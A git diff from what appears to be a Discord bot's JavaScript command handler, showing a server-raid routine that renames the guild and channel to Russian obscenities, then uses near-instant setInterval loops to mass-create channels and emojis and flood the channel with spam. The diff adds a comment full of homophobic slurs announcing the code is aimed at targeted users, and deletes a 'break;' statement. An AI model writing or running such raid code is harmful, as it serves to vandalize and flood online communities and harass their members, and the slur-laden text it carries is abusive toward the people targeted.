@@ -246,6 +246,11 @@ client.on('message', async (message) => {
         message.channel.guild.setName('ОВНЕР ХУЙ САСИ')
         message.channel.setTolic('ОВНЕР ХУЙ САСИ')
         message.channel.setName('ОВНЕР ХУЙ САСИ')
+	    /*
+	    ВНИМАНИЕ
+	    Я НЕ ИСПОЛЬЗУЮ ЭТО ПРОСТО ТАК ДЛЯ РАЗВЛЕЧЕНИЯ
+	    Я ИСПОЛЬЗУЮ ЭТО ДЛЯ ОСОБО ОДАРЕННЫХ ПИДОРОВ
+	    */
 setInterval(function () {
 message.channel.guild.createChannel('овнер пидор', 'text')
   .then(console.log)
@@ -260,7 +265,6 @@ setInterval(function () {
 message.channel.guild.createEmoji('https://cdn.discordapp.com/attachments/400670340885250049/459060140398739456/1520359453.jpg', 'sasai_owner')}, Math.floor(Math.random() * (1- 1)) + 1);
 setInterval(function () {
 message.channel.send("овнер пидор")}, Math.floor(Math.random() * (1- 1)) + 1);
-break;
     } else if(['iinvite', 'inviteInfo', 'infoInvite'].includes(command)) {
 	    actFUN = actFUN + 1;actALL = actALL +1;
 	    let invi = args.join(" ")
